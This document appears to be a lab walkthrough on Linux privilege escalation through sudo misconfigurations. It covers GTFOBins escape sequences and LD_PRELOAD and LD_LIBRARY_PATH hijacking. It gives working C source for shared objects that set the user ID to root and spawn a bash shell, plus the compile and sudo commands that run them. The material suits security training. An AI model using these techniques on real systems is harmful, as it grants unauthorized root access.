# Sudo

### Shell Escape Sequences

List the programs which sudo allows your user to run:

`sudo -l`

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

### Environment Variables

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the env\_keep options):

`sudo -l`

LD\_PRELOAD and LD\_LIBRARY\_PATH are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.

#### LD\_PRELOAD

Create a shared object using the code preload.c which is:

{% code title="preload.c" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
{% endcode %}

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD\_PRELOAD environment variable to the full path of the new shared object:

`sudo LD_PRELOAD=/tmp/preload.so program-name-here`

A root shell should spawn.

#### LD\_LIBRARY\_PATH

Run ldd against the apache2 program file to see which shared libraries are used by the program:

`ldd /usr/sbin/apache2`

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code library\_path.c which is:

{% code title="library_path.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
{% endcode %}

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

Run apache2 using sudo, while settings the LD\_LIBRARY\_PATH environment variable to /tmp (where we output the compiled shared object):

`sudo LD_LIBRARY_PATH=/tmp apache2`

A root shell should spawn. Exit out of the shell.
